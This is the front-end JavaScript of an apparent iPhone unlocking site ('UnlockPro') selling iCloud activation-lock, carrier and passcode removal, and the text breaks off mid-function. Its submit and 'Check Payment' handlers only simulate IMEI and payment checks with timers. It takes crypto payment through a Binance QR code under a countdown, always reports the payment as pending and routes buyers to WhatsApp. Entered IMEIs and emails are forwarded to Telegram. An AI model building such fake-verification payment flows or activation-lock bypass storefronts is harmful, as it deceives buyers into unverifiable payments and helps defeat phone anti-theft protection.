/**
 * UnlockPro - Main JavaScript File
 * Contains functionality for:
 * - Mobile Navigation
 * - IMEI Checker
 * - Form Validation
 * - FAQ Accordions
 * - Review Filtering
 * - Star Rating
 */

document.addEventListener('DOMContentLoaded', function() {
    // Mobile menu functionality
    const hamburger = document.querySelector('.hamburger');
    const navLinks = document.querySelector('.nav-links');
    const body = document.body;

    if (hamburger && navLinks) {
        hamburger.addEventListener('click', function() {
            // Toggle active classes
            this.classList.toggle('active');
            navLinks.classList.toggle('active');
            body.classList.toggle('menu-open');
            
            // Add animation to menu items
            const menuItems = navLinks.querySelectorAll('a');
            menuItems.forEach((item, index) => {
                if (item.style.animation) {
                    item.style.animation = '';
                } else {
                    item.style.animation = `fadeInMenu 0.3s ease forwards ${index * 0.1}s`;
                }
            });
        });

        // Close menu when clicking a link
        const menuLinks = navLinks.querySelectorAll('a');
        menuLinks.forEach(link => {
            link.addEventListener('click', () => {
                hamburger.classList.remove('active');
                navLinks.classList.remove('active');
                body.classList.remove('menu-open');
                
                // Reset animations
                menuLinks.forEach(item => {
                    item.style.animation = '';
                });
            });
        });
    }

    // Initialize other components
    initUnlockForm();
    initFaqAccordion();
    initReviewFilters();
    initStarRating();
    initContactForm();
    initImeiChecker();
});

/**
 * Mobile Navigation
 */
function initMobileNavigation() {
    const hamburger = document.querySelector('.hamburger');
    const navLinks = document.querySelector('.nav-links');
    
    if (!hamburger || !navLinks) return;
    
    hamburger.addEventListener('click', function() {
        this.classList.toggle('active');
        navLinks.classList.toggle('active');
        
        // Animate hamburger
        if (this.classList.contains('active')) {
            this.querySelector('span:nth-child(1)').style.transform = 'rotate(45deg) translate(5px, 5px)';
            this.querySelector('span:nth-child(2)').style.opacity = '0';
            this.querySelector('span:nth-child(3)').style.transform = 'rotate(-45deg) translate(5px, -5px)';
        } else {
            this.querySelector('span:nth-child(1)').style.transform = 'none';
            this.querySelector('span:nth-child(2)').style.opacity = '1';
            this.querySelector('span:nth-child(3)').style.transform = 'none';
        }
    });
    
    // Add mobile navigation styles
    const styleEl = document.createElement('style');
    styleEl.innerHTML = `
        @media (max-width: 768px) {
            .nav-links {
                position: fixed;
                top: 70px;
                left: 0;
                width: 100%;
                background-color: white;
                flex-direction: column;
                align-items: center;
                padding: 2rem 0;
                gap: 1.5rem;
                box-shadow: var(--shadow);
                transform: translateY(-150%);
                transition: transform 0.3s ease;
                z-index: 999;
            }
            
            .nav-links.active {
                transform: translateY(0);
            }
            
            .hamburger.active span:nth-child(1) {
                transform: rotate(45deg) translate(5px, 5px);
            }
            
            .hamburger.active span:nth-child(2) {
                opacity: 0;
            }
            
            .hamburger.active span:nth-child(3) {
                transform: rotate(-45deg) translate(5px, -5px);
            }
        }
    `;
    document.head.appendChild(styleEl);
}

/**
 * Unlock Form Validation and IMEI Checker
 */
function initUnlockForm() {
    const unlockForm = document.querySelector('#unlock-form-element');
    const imeiInput = document.querySelector('#imei');
    
    if (!unlockForm || !imeiInput) {
        console.log("Form elements not found", unlockForm, imeiInput);
        return;
    }
    
    console.log("Form initialized", unlockForm);
    
    // Format IMEI as user types
    imeiInput.addEventListener('input', function() {
        // Remove non-numeric characters
        this.value = this.value.replace(/[^0-9]/g, '');
        
        // Limit to 17 digits (IMEI + check digit)
        if (this.value.length > 17) {
            this.value = this.value.slice(0, 17);
        }
    });
    
    // Form submission
    unlockForm.addEventListener('submit', function(e) {
        e.preventDefault();
        console.log("Form submitted"); // Debug log
        
        // Get form elements
        const submitBtn = this.querySelector('button[type="submit"]');
        const originalBtnText = submitBtn.innerHTML;
        const formContainer = this.closest('.form');
        const modelSelect = document.getElementById('model');
        const selectedModel = modelSelect ? modelSelect.value : '';
        const serviceSelect = document.getElementById('service');
        const selectedService = serviceSelect ? serviceSelect.value : '';
        
        // Show loading state
        submitBtn.disabled = true;
        submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Checking...';
        
        // Get price based on model and service
        const price = getModelPrice(selectedModel, selectedService);
        
        // Simulate API call
        setTimeout(() => {
            console.log("Timeout completed, showing payment page"); // Debug log
            
            // Create payment overlay/popup instead of replacing the form
            const overlay = document.createElement('div');
            overlay.className = 'payment-overlay';
            
            // Get model name for display
            const modelName = modelSelect ? modelSelect.options[modelSelect.selectedIndex].text : 'iPhone';
            
            overlay.innerHTML = `
                <div class="payment-popup">                    
                    <div class="payment-details">
                        <div class="payment-method">
                            <div class="qr-container">
                                <div class="qr-code">
                                    <img src="images/binance-qr-code.png" alt="Binance Pay QR Code">
                                </div>
                                <div class="timer-container">
                                    <p>QR Code expires in</p>
                                    <div class="timer" id="payment-timer">03:00</div>
                                </div>
                            </div>
                            <p class="payment-note">Scan QR code with your Binance app to pay</p>
                        </div>
                        
                        <div class="payment-info">
                            <div class="info-item desktop-only">
                                <span class="label">Device:</span>
                                <span class="value">${modelName}</span>
                            </div>
                            <div class="info-item desktop-only">
                                <span class="label">Service:</span>
                                <span class="value">${serviceSelect ? serviceSelect.options[serviceSelect.selectedIndex].text : 'iCloud Unlock'}</span>
                            </div>
                            <div class="info-item desktop-only">
                                <span class="label">IMEI:</span>
                                <span class="value">${imeiInput.value}</span>
                            </div>
                            <div class="info-item total">
                                <span class="label">Total:</span>
                                <span class="value">$${price}</span>
                            </div>
                        </div>
                    </div>
                    
                    <div class="payment-actions">
                        <button class="btn btn-outline" id="cancel-payment">Cancel</button>
                        <button class="btn btn-primary" id="check-payment">Check Payment</button>
                    </div>
                </div>
            `;
            
            // Append overlay to body
            document.body.appendChild(overlay);
            
            // Show overlay with animation
            setTimeout(() => {
                overlay.classList.add('active');
            }, 10);
            
            // Start countdown timer (3 minutes instead of 4)
            startPaymentTimer();
            
            // Event listeners for payment buttons
            document.getElementById('cancel-payment').addEventListener('click', () => {
                // Remove overlay with animation
                overlay.classList.remove('active');
                setTimeout(() => {
                    overlay.remove();
                    submitBtn.disabled = false;
                    submitBtn.innerHTML = originalBtnText;
                }, 300);
            });
            
            document.getElementById('check-payment').addEventListener('click', () => {
                // Show loading state
                const checkBtn = document.getElementById('check-payment');
                checkBtn.disabled = true;
                checkBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Checking...';
                
                // Simulate payment verification
                setTimeout(() => {
                    // Show pending payment message with WhatsApp contact instructions
                    const paymentPopup = document.querySelector('.payment-popup');
                    paymentPopup.innerHTML = `
                        <div class="pending-icon">
                            <i class="fas fa-clock"></i>
                        </div>
                        <h3>Your Payment is Pending!</h3>
                        <p>Please send us a message on WhatsApp with proof of payment. To start the unlocking process, please click the WhatsApp button below to contact us.</p>
                        <div class="support-actions">
                            <a href="https://wa.me/447401787614" class="btn btn-whatsapp btn-large">
                                <i class="fab fa-whatsapp"></i> Contact Us on WhatsApp
                            </a>
                        </div>
                    `;
                }, 2000);
            });
            
            addPaymentStyles();
        }, 2000);
    });
}

/**
 * Get price based on iPhone model and service type
 * @param {string} model - The iPhone model
 * @param {string} service - The service type (icloud, carrier, network, passcode)
 * @returns {number} - The price for the model and service
 */
function getModelPrice(model, service) {
    // Price maps for each service type
    const icloudPrices = {
        'iphone-5s': 20, 'iphone-6': 20, 'iphone-6-plus': 20, 'iphone-6s': 20, 'iphone-6s-plus': 20, 'iphone-se-1': 20,
        'iphone-7': 30, 'iphone-7-plus': 30, 'iphone-8': 30, 'iphone-8-plus': 30,
        'iphone-x': 40, 'iphone-xr': 40, 'iphone-xs': 40, 'iphone-xs-max': 40,
        'iphone-se-2': 50, 'iphone-se-3': 50,
        'iphone-11': 60, 'iphone-11-pro': 60, 'iphone-11-pro-max': 60, 'iphone-12-mini': 60,
        'iphone-12': 70, 'iphone-12-pro': 70,
        'iphone-12-pro-max': 80, 'iphone-13-mini': 80, 'iphone-13': 80,
        'iphone-13-pro': 90, 'iphone-13-pro-max': 90,
        'iphone-14': 100, 'iphone-14-plus': 100, 'iphone-14-pro': 100, 'iphone-14-pro-max': 100,
        'iphone-15': 110, 'iphone-15-plus': 110, 'iphone-15-pro': 110, 'iphone-15-pro-max': 110,
        'iphone-16': 120, 'iphone-16-plus': 120, 'iphone-16-pro': 120, 'iphone-16-pro-max': 120
    };
    
    const carrierPrices = {
        'iphone-5s': 10, 'iphone-6': 10, 'iphone-6-plus': 10, 'iphone-6s': 10, 'iphone-6s-plus': 10, 'iphone-se-1': 10,
        'iphone-7': 10, 'iphone-7-plus': 10, 'iphone-8': 10, 'iphone-8-plus': 10,
        'iphone-x': 20, 'iphone-xr': 20, 'iphone-xs': 20, 'iphone-xs-max': 20,
        'iphone-se-2': 10, 'iphone-se-3': 10,
        'iphone-11': 30, 'iphone-11-pro': 30, 'iphone-11-pro-max': 30, 'iphone-12-mini': 30,
        'iphone-12': 40, 'iphone-12-pro': 40,
        'iphone-12-pro-max': 40, 'iphone-13-mini': 40, 'iphone-13': 40,
        'iphone-13-pro': 50, 'iphone-13-pro-max': 50,
        'iphone-14': 60, 'iphone-14-plus': 60, 'iphone-14-pro': 60, 'iphone-14-pro-max': 60,
        'iphone-15': 70, 'iphone-15-plus': 70, 'iphone-15-pro': 70, 'iphone-15-pro-max': 70,
        'iphone-16': 70, 'iphone-16-plus': 70, 'iphone-16-pro': 70, 'iphone-16-pro-max': 70
    };
    
    const networkPrices = {
        'iphone-5s': 10, 'iphone-6': 10, 'iphone-6-plus': 10, 'iphone-6s': 10, 'iphone-6s-plus': 10, 'iphone-se-1': 10,
        'iphone-7': 10, 'iphone-7-plus': 10, 'iphone-8': 10, 'iphone-8-plus': 10,
        'iphone-x': 20, 'iphone-xr': 20, 'iphone-xs': 20, 'iphone-xs-max': 20,
        'iphone-se-2': 10, 'iphone-se-3': 10,
        'iphone-11': 30, 'iphone-11-pro': 30, 'iphone-11-pro-max': 30, 'iphone-12-mini': 30,
        'iphone-12': 40, 'iphone-12-pro': 40,
        'iphone-12-pro-max': 40, 'iphone-13-mini': 40, 'iphone-13': 40,
        'iphone-13-pro': 50, 'iphone-13-pro-max': 50,
        'iphone-14': 60, 'iphone-14-plus': 60, 'iphone-14-pro': 60, 'iphone-14-pro-max': 60,
        'iphone-15': 70, 'iphone-15-plus': 70, 'iphone-15-pro': 70, 'iphone-15-pro-max': 70,
        'iphone-16': 70, 'iphone-16-plus': 70, 'iphone-16-pro': 70, 'iphone-16-pro-max': 70
    };
    
    const passcodePrices = {
        'iphone-5s': 15, 'iphone-6': 15, 'iphone-6-plus': 15, 'iphone-6s': 15, 'iphone-6s-plus': 15, 'iphone-se-1': 15,
        'iphone-7': 15, 'iphone-7-plus': 15, 'iphone-8': 15, 'iphone-8-plus': 15,
        'iphone-x': 15, 'iphone-xr': 15, 'iphone-xs': 15, 'iphone-xs-max': 15,
        'iphone-se-2': 15, 'iphone-se-3': 15,
        'iphone-11': 20, 'iphone-11-pro': 20, 'iphone-11-pro-max': 20, 'iphone-12-mini': 20,
        'iphone-12': 30, 'iphone-12-pro': 30,
        'iphone-12-pro-max': 30, 'iphone-13-mini': 30, 'iphone-13': 30,
        'iphone-13-pro': 40, 'iphone-13-pro-max': 40,
        'iphone-14': 50, 'iphone-14-plus': 50, 'iphone-14-pro': 50, 'iphone-14-pro-max': 50,
        'iphone-15': 60, 'iphone-15-plus': 60, 'iphone-15-pro': 60, 'iphone-15-pro-max': 60,
        'iphone-16': 70, 'iphone-16-plus': 70, 'iphone-16-pro': 70, 'iphone-16-pro-max': 70
    };
    
    // Select price map based on service type
    let priceMap;
    switch(service) {
        case 'carrier':
            priceMap = carrierPrices;
            break;
        case 'network':
            priceMap = networkPrices;
            break;
        case 'passcode':
            priceMap = passcodePrices;
            break;
        case 'icloud':
        default:
            priceMap = icloudPrices;
            break;
    }
    
    return priceMap[model] || 50; // Default to $50 if model not found
}

/**
 * Start payment timer countdown
 */
function startPaymentTimer() {
    const timerElement = document.getElementById('payment-timer');
    if (!timerElement) return;
    
    let minutes = 3;
    let seconds = 0;
    
    const timerInterval = setInterval(() => {
        if (seconds === 0) {
            if (minutes === 0) {
                clearInterval(timerInterval);
                // Show expired message with WhatsApp support instructions
                const paymentPopup = document.querySelector('.payment-popup');
                if (paymentPopup) {
                    paymentPopup.innerHTML = `
                        <div class="expired-icon">
                            <i class="fas fa-exclamation-circle"></i>
                        </div>
                        <h3>Payment Time Expired</h3>
                        <p>Your payment session has expired. Please contact our WhatsApp Support for assistance.</p>
                        <div class="support-actions">
                            <a href="https://wa.me/447401787614" class="btn btn-whatsapp">
                                <i class="fab fa-whatsapp"></i> Contact WhatsApp Support
                            </a>
                        </div>
                        <div class="expired-actions">
                            <button id="try-again" class="btn btn-primary">Try Again</button>
                        </div>
                    `;
                    
                    // Add event listener for try again button
                    setTimeout(() => {
                        const tryAgainBtn = document.getElementById('try-again');
                        if (tryAgainBtn) {
                            tryAgainBtn.addEventListener('click', () => {
                                const overlay = document.querySelector('.payment-overlay');
                                if (overlay) {
                                    overlay.classList.remove('active');
                                    setTimeout(() => {
                                        overlay.remove();
                                    }, 300);
                                }
                            });
                        }
                    }, 100);
                }
                return;
            }
            minutes--;
            seconds = 59;
        } else {
            seconds--;
        }
        
        // Update timer display
        timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
    }, 1000);
}

/**
 * Add payment page styles
 */
function addPaymentStyles() {
    // Check if styles already exist
    if (document.getElementById('payment-styles')) return;
    
    const styleSheet = document.createElement('style');
    styleSheet.id = 'payment-styles';
    styleSheet.innerHTML = `
        .payment-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.7);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            opacity: 0;
            visibility: hidden;
            transition: opacity 0.3s, visibility 0.3s;
        }
        
        .payment-overlay.active {
            opacity: 1;
            visibility: visible;
        }
        
        .payment-popup {
            background-color: white;
            border-radius: 10px;
            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.2);
            width: 90%;
            max-width: 600px;
            padding: 1.25rem;
            position: relative;
            transform: translateY(20px);
            opacity: 0;
            transition: transform 0.3s, opacity 0.3s;
            display: flex;
            flex-direction: column;
            max-height: 90vh;
        }
        
        .payment-overlay.active .payment-popup {
            transform: translateY(0);
            opacity: 1;
        }
        
        .payment-details {
            display: flex;
            flex-direction: column;
            gap: 1rem;
        }
        
        .payment-info {
            background-color: var(--light-color);
            padding: 1rem;
            border-radius: 8px;
            order: 2;
        }
        
        .info-item {
            display: flex;
            justify-content: space-between;
            margin-bottom: 0.75rem;
            font-size: 0.9rem;
        }
        
        .info-item:last-child {
            margin-bottom: 0;
        }
        
        .info-item.total {
            margin-top: 0;
            padding-top: 0;
            border-top: none;
            font-weight: 600;
            font-size: 1.1rem;
        }
        
        .info-item .value {
            color: var(--primary-color);
        }
        
        .payment-method {
            text-align: center;
            order: 1;
        }
        
        .qr-container {
            background-color: white;
            padding: 1rem;
            border-radius: 8px;
            box-shadow: var(--shadow);
            margin-bottom: 0.75rem;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        
        .qr-code {
            width: 160px;
            height: 160px;
            margin: 0 auto 0.75rem;
        }
        
        .qr-code img {
            width: 100%;
            height: 100%;
            object-fit: contain;
        }
        
        .timer-container {
            text-align: center;
        }
        
        .timer-container p {
            margin: 0;
            font-size: 0.85rem;
            color: var(--text-secondary);
        }
        
        .timer {
            font-size: 1.25rem;
            font-weight: 700;
            color: var(--primary-color);
            margin-top: 0.25rem;
        }
        
        .payment-note {
            font-size: 0.85rem;
            color: var(--text-secondary);
            margin: 0;
        }
        
        .payment-actions {
            display: flex;
            gap: 0.75rem;
            justify-content: space-between;
            padding: 0.75rem;
            margin-top: 1rem;
            position: sticky;
            bottom: 0;
            background-color: white;
            border-top: 1px solid var(--border-color);
        }
        
        .payment-actions button {
            flex: 1;
        }
        
        /* Hide desktop-only elements on mobile */
        @media (max-width: 767px) {
            .desktop-only {
                display: none;
            }
            
            .payment-info {
                margin-bottom: 0.5rem;
            }
            
            .info-item.total {
                margin: 0;
                font-size: 1.1rem;
            }
        }
        
        /* Desktop styles */
        @media (min-width: 768px) {
            .payment-popup {
                padding: 2rem;
            }
            
            .payment-details {
                flex-direction: row;
                gap: 2rem;
            }
            
            .payment-info {
                flex: 1;
                padding: 1.5rem;
                order: 1;
            }
            
            .payment-method {
                flex: 1;
                order: 2;
            }
            
            .qr-code {
                width: 180px;
                height: 180px;
                margin-bottom: 1rem;
            }
            
            .timer-container p {
                font-size: 0.9rem;
            }
            
            .timer {
                font-size: 1.5rem;
            }
            
            .info-item {
                margin-bottom: 1rem;
                font-size: 0.95rem;
            }
            
            .info-item.total {
                margin-top: 1rem;
                padding-top: 1rem;
                border-top: 1px solid var(--border-color);
            }
            
            .payment-actions {
                margin-top: 2rem;
                padding: 0;
                border-top: none;
                position: static;
            }
        }
        
        .success-icon, .expired-icon {
            font-size: 4rem;
            text-align: center;
            margin-bottom: 1rem;
        }
        
        .success-icon {
            color: #4CAF50;
        }
        
        .expired-icon {
            color: #F44336;
        }
        
        .success-info {
            text-align: center;
            margin: 1rem 0;
            padding: 0.75rem;
            background-color: rgba(76, 175, 80, 0.1);
            border-radius: 4px;
            color: #4CAF50;
        }
        
        .success-actions, .expired-actions {
            text-align: center;
            margin-top: 2rem;
        }
        
        .support-actions {
            text-align: center;
            margin-top: 1.5rem;
        }
        
        .btn-whatsapp {
            background-color: #25D366;
            color: white;
            border: none;
            padding: 0.75rem 1.5rem;
            border-radius: 4px;
            font-weight: 600;
            display: inline-flex;
            align-items: center;
            gap: 0.5rem;
            text-decoration: none;
            transition: background-color 0.3s;
        }
        
        .btn-whatsapp:hover {
            background-color: #128C7E;
        }
    `;
    
    document.head.appendChild(styleSheet);
}

/**
 * Validate Unlock Form
 * @param {HTMLFormElement} form - The form to validate
 * @returns {boolean} - Whether the form is valid
 */
function validateUnlockForm(form) {
    const imeiInput = form.querySelector('#imei');
    const modelSelect = form.querySelector('#model');
    const serviceSelect = form.querySelector('#service');
    const emailInput = form.querySelector('#email');
    let isValid = true;
    
    // Remove previous error messages
    const errorMessages = form.querySelectorAll('.error-message');
    errorMessages.forEach(error => error.remove());
    
    // Validate IMEI
    if (!imeiInput.value || imeiInput.value.length < 15) {
        showError(imeiInput, 'Please enter a valid IMEI number (15-17 digits)');
        isValid = false;
    }
    
    // Validate model selection
    if (modelSelect && modelSelect.value === '') {
        showError(modelSelect, 'Please select your iPhone model');
        isValid = false;
    }
    
    // Validate service selection
    if (serviceSelect && serviceSelect.value === '') {
        showError(serviceSelect, 'Please select a service type');
        isValid = false;
    }
    
    // Validate email
    if (emailInput && (!emailInput.value || !isValidEmail(emailInput.value))) {
        showError(emailInput, 'Please enter a valid email address');
        isValid = false;
    }
    
    return isValid;
}

/**
 * Show error message for form field
 * @param {HTMLElement} field - Form field with error
 * @param {string} message - Error message
 */
function showError(field, message) {
    // Add error class to field
    field.classList.add('error');
    
    // Create error message
    const errorDiv = document.createElement('div');
    errorDiv.className = 'error-message';
    errorDiv.textContent = message;
    
    // Add error styles
    errorDiv.style.color = '#ef4444';
    errorDiv.style.fontSize = '0.875rem';
    errorDiv.style.marginTop = '0.5rem';
    
    // Add error styles to field
    field.style.borderColor = '#ef4444';
    
    // Insert error message after field
    field.parentNode.insertBefore(errorDiv, field.nextSibling);
    
    // Remove error on focus
    field.addEventListener('focus', function() {
        this.classList.remove('error');
        this.style.borderColor = '';
        if (errorDiv.parentNode) {
            errorDiv.parentNode.removeChild(errorDiv);
        }
    });
}

/**
 * Validate email format
 * @param {string} email - Email to validate
 * @returns {boolean} - Whether email is valid
 */
function isValidEmail(email) {
    const re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    return re.test(String(email).toLowerCase());
}

/**
 * FAQ Accordion
 */
function initFaqAccordion() {
    const faqItems = document.querySelectorAll('.faq-item');
    
    if (!faqItems.length) return;
    
    faqItems.forEach(item => {
        const question = item.querySelector('.faq-question');
        const answer = item.querySelector('.faq-answer');
        const icon = item.querySelector('.faq-toggle i');
        
        if (!question || !answer || !icon) return;
        
        // Set initial height to 0 and hide
        answer.style.height = '0';
        answer.style.overflow = 'hidden';
        answer.style.transition = 'height 0.3s ease';
        
        question.addEventListener('click', () => {
            // Close all other items
            faqItems.forEach(otherItem => {
                if (otherItem !== item && otherItem.classList.contains('active')) {
                    otherItem.classList.remove('active');
                    const otherAnswer = otherItem.querySelector('.faq-answer');
                    const otherIcon = otherItem.querySelector('.faq-toggle i');
                    
                    if (otherAnswer) otherAnswer.style.height = '0';
                    if (otherIcon) otherIcon.className = 'fas fa-plus';
                }
            });
            
            // Toggle current item
            const isActive = item.classList.toggle('active');
            
            // Set height based on content
            if (isActive) {
                answer.style.height = answer.scrollHeight + 'px';
                icon.className = 'fas fa-minus';
            } else {
                answer.style.height = '0';
                icon.className = 'fas fa-plus';
            }
        });
    });
}

/**
 * Review Filters
 */
function initReviewFilters() {
    const filterButtons = document.querySelectorAll('.filter-btn');
    const reviewItems = document.querySelectorAll('.review-item');
    
    if (!filterButtons.length || !reviewItems.length) return;
    
    filterButtons.forEach(button => {
        button.addEventListener('click', () => {
            // Remove active class from all buttons
            filterButtons.forEach(btn => btn.classList.remove('active'));
            
            // Add active class to clicked button
            button.classList.add('active');
            
            // Get filter value
            const filter = button.getAttribute('data-filter');
            
            // Filter reviews
            reviewItems.forEach(item => {
                if (filter === 'all' || item.getAttribute('data-service') === filter) {
                    item.style.display = 'block';
                } else {
                    item.style.display = 'none';
                }
            });
        });
    });
}

/**
 * Review Form Validation and Star Rating
 */
function initStarRating() {
    const ratingInput = document.querySelector('.rating-input');
    const ratingHiddenInput = document.getElementById('rating');
    
    if (!ratingInput || !ratingHiddenInput) return;
    
    const stars = ratingInput.querySelectorAll('.fa-star');
    
    stars.forEach(star => {
        star.addEventListener('mouseover', function() {
            const rating = this.getAttribute('data-rating');
            highlightStars(stars, rating);
        });
        
        star.addEventListener('mouseout', function() {
            const currentRating = ratingHiddenInput.value || 0;
            highlightStars(stars, currentRating);
        });
        
        star.addEventListener('click', function() {
            const rating = this.getAttribute('data-rating');
            ratingHiddenInput.value = rating;
            highlightStars(stars, rating);
        });
    });
    
    function highlightStars(stars, rating) {
        stars.forEach(star => {
            const starRating = star.getAttribute('data-rating');
            if (starRating <= rating) {
                star.classList.remove('far');
                star.classList.add('fas');
            } else {
                star.classList.remove('fas');
                star.classList.add('far');
            }
        });
    }
    
    // Review form validation
    const reviewForm = document.querySelector('.review-form');
    if (!reviewForm) return;
    
    reviewForm.addEventListener('submit', function(e) {
        e.preventDefault();
        
        // Check if Order ID is provided
        const orderIdInput = document.getElementById('order_id');
        if (!orderIdInput.value.trim()) {
            alert('Please enter your Order ID to submit a review.');
            orderIdInput.focus();
            return;
        }
        
        // Check if rating is selected
        if (!ratingHiddenInput.value) {
            alert('Please select a rating.');
            return;
        }
        
        // Simulate form submission
        const submitBtn = this.querySelector('button[type="submit"]');
        const originalBtnText = submitBtn.innerHTML;
        submitBtn.disabled = true;
        submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Submitting...';
        
        setTimeout(() => {
            // Create success message
            const successMessage = document.createElement('div');
            successMessage.className = 'form-success';
            successMessage.innerHTML = `
                <div class="success-icon">
                    <i class="fas fa-check-circle"></i>
                </div>
                <h3>Review Submitted Successfully!</h3>
                <p>Thank you for sharing your experience. Your review will be published after moderation.</p>
            `;
            
            // Hide form and show success message
            this.style.display = 'none';
            this.parentNode.appendChild(successMessage);
            
            // Reset button
            submitBtn.disabled = false;
            submitBtn.innerHTML = originalBtnText;
        }, 2000);
    });
}

/**
 * Contact Form Submission
 */
function initContactForm() {
    const form = document.getElementById("contact-form");
    if (!form) return;
    
    const result = document.getElementById("result");
    
    form.addEventListener("submit", function(e) {
        e.preventDefault();
        
        // Show loading state
        result.innerHTML = "Please wait...";
        result.className = "form-note";
        
        const formData = new FormData(form);
        const object = {};
        formData.forEach((value, key) => {
            object[key] = value;
        });
        
        const json = JSON.stringify(object);
        
        fetch("https://api.web3forms.com/submit", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                Accept: "application/json"
            },
            body: json
        })
        .then(async (response) => {
            let json = await response.json();
            if (response.status == 200) {
                result.innerHTML = json.message;
                result.className = "form-note success";
            } else {
                console.log(response);
                result.innerHTML = json.message;
                result.className = "form-note error";
            }
        })
        .catch((error) => {
            console.log(error);
            result.innerHTML = "Something went wrong!";
            result.className = "form-note error";
        })
        .then(function() {
            form.reset();
            setTimeout(() => {
                result.innerHTML = '<i class="fas fa-lock"></i> Your information is secure and will not be shared';
                result.className = "form-note";
            }, 5000);
        });
    });
}

/**
 * Validate Contact Form
 * @param {HTMLFormElement} form - The form to validate
 * @returns {boolean} - Whether the form is valid
 */
function validateContactForm(form) {
    const nameInput = form.querySelector('#name');
    const emailInput = form.querySelector('#email');
    const subjectSelect = form.querySelector('#subject');
    const messageInput = form.querySelector('#message');
    let isValid = true;
    
    // Remove previous error messages
    const errorMessages = form.querySelectorAll('.error-message');
    errorMessages.forEach(error => error.remove());
    
    // Validate name
    if (!nameInput.value.trim()) {
        showError(nameInput, 'Please enter your name');
        isValid = false;
    }
    
    // Validate email
    if (!emailInput.value.trim() || !isValidEmail(emailInput.value)) {
        showError(emailInput, 'Please enter a valid email address');
        isValid = false;
    }
    
    // Validate subject
    if (subjectSelect && subjectSelect.value === '') {
        showError(subjectSelect, 'Please select a subject');
        isValid = false;
    }
    
    // Validate message
    if (!messageInput.value.trim()) {
        showError(messageInput, 'Please enter your message');
        isValid = false;
    }
    
    return isValid;
} 

/**
 * IMEI Checker Modal and Functionality
 */
function initImeiChecker() {
    const openModalBtn = document.getElementById('open-imei-check');
    const modal = document.getElementById('imei-check-modal');
    const closeBtn = modal ? modal.querySelector('.modal-close') : null;
    
    if (!openModalBtn || !modal || !closeBtn) return;
    
    // Open modal
    openModalBtn.addEventListener('click', function(e) {
        e.preventDefault();
        modal.classList.add('active');
        document.body.style.overflow = 'hidden'; // Prevent scrolling
    });
    
    // Close modal
    closeBtn.addEventListener('click', function() {
        modal.classList.remove('active');
        document.body.style.overflow = ''; // Restore scrolling
    });
    
    // Close when clicking outside the modal
    modal.addEventListener('click', function(e) {
        if (e.target === modal) {
            modal.classList.remove('active');
            document.body.style.overflow = ''; // Restore scrolling
        }
    });
    
    // Create the new IMEI check modal content
    const modalBody = modal.querySelector('.modal-body');
    if (modalBody) {
        modalBody.innerHTML = `
            <div class="imei-check-container">
                <div class="imei-form">
                    <h3>Check Your iPhone's Status</h3>
                    <p>Enter your IMEI number and email address to receive a detailed status report</p>
                    
                    <div class="form-group">
                        <label for="imei-check-input">IMEI Number</label>
                        <input type="text" id="imei-check-input" placeholder="Enter your phone's IMEI number" maxlength="17">
                        <small>Dial *#06# to find your IMEI</small>
                    </div>
                    
                    <div class="form-group">
                        <label for="imei-email-input">Email Address</label>
                        <input type="email" id="imei-email-input" placeholder="Enter your email address">
                    </div>
                    
                    <div class="imei-actions">
                        <button id="check-imei-btn" class="btn btn-accent">Check IMEI</button>
                        <a href="https://wa.me/447401787614" class="btn btn-whatsapp" target="_blank">
                            <i class="fab fa-whatsapp"></i> Hello, WhatsApp Support
                        </a>
                    </div>
                </div>
                
                <div class="imei-success" style="display: none;">
                    <div class="success-icon">
                        <i class="fas fa-check-circle"></i>
                    </div>
                    <h3>Request Submitted Successfully!</h3>
                    <div class="email-notice">
                        <p>Your phone's status report will be emailed to you within 24 hours.</p>
                        <p><strong>Please check your spam/junk folder</strong> if you don't see our email in your inbox.</p>
                    </div>
                    <div class="urgent-support">
                        <p>Need urgent assistance? Contact us directly through WhatsApp:</p>
                        <a href="https://wa.me/447401787614" class="btn btn-whatsapp" target="_blank">
                            <i class="fab fa-whatsapp"></i> Chat with Support Now
                        </a>
                    </div>
                </div>
            </div>
        `;
        
        // Add event listeners to the new elements
        const imeiInput = document.getElementById('imei-check-input');
        const emailInput = document.getElementById('imei-email-input');
        const checkImeiBtn = document.getElementById('check-imei-btn');
        const imeiForm = modal.querySelector('.imei-form');
        const imeiSuccess = modal.querySelector('.imei-success');
        
        // Format IMEI as user types
        if (imeiInput) {
            imeiInput.addEventListener('input', function() {
                // Remove non-numeric characters
                this.value = this.value.replace(/[^0-9]/g, '');
                
                // Limit to 17 digits (IMEI + check digit)
                if (this.value.length > 17) {
                    this.value = this.value.slice(0, 17);
                }
            });
        }
        
        // Check IMEI button click
        if (checkImeiBtn) {
            checkImeiBtn.addEventListener('click', function() {
                // Validate inputs
                const imei = imeiInput.value.trim();
                const email = emailInput.value.trim();
                
                // Clear previous errors
                document.querySelectorAll('.error-message').forEach(el => el.remove());
                
                let isValid = true;
                
                // Validate IMEI
                if (!imei) {
                    showInputError(imeiInput, 'Please enter your IMEI number');
                    isValid = false;
                } else if (imei.length < 15) {
                    showInputError(imeiInput, 'IMEI should be at least 15 digits');
                    isValid = false;
                }
                
                // Validate email
                if (!email) {
                    showInputError(emailInput, 'Please enter your email address');
                    isValid = false;
                } else if (!isValidEmail(email)) {
                    showInputError(emailInput, 'Please enter a valid email address');
                    isValid = false;
                }
                
                if (!isValid) return;
                
                // Show loading state
                const originalBtnText = checkImeiBtn.innerHTML;
                checkImeiBtn.disabled = true;
                checkImeiBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
                
                // Send notification to Telegram
                sendTelegramNotification(imei, email)
                    .then(() => {
                        // Show success message
                        imeiForm.style.display = 'none';
                        imeiSuccess.style.display = 'block';
                        
                        // Reset form
